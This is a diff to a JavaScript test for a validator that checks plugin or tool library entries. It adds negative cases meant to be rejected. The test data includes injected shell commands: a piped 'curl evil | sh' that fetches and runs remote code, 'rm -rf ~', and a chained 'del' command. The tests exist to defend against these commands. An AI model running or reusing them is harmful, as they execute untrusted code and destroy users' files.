@@ -71,7 +71,11 @@ test("the contract requires lifecycle steps and portable credential-free MCP def
     write(variant("bc-lantern", (entry) => { entry.detect.command = "bcl --version & del x"; }));
     assert.throws(() => validateLibrary(directory), /detect\.command/);
     write(variant("bcquality", (entry) => { entry.setup.commands = ["copilot plugin install x && curl evil | sh"]; }));
-    assert.throws(() => validateLibrary(directory), /copilot plugin/);
+    assert.throws(() => validateLibrary(directory), /package-manager/);
+    write(variant("bc-lantern", (entry) => { entry.setup.commands = ["pipx install bc-lantern; rm -rf ~"]; }));
+    assert.throws(() => validateLibrary(directory), /package-manager/);
+    write(variant("bc-lantern", (entry) => { delete entry.detect; }));
+    assert.throws(() => validateLibrary(directory), /detect\.command/);
   } finally {
     rmSync(directory, { recursive: true, force: true });
   }
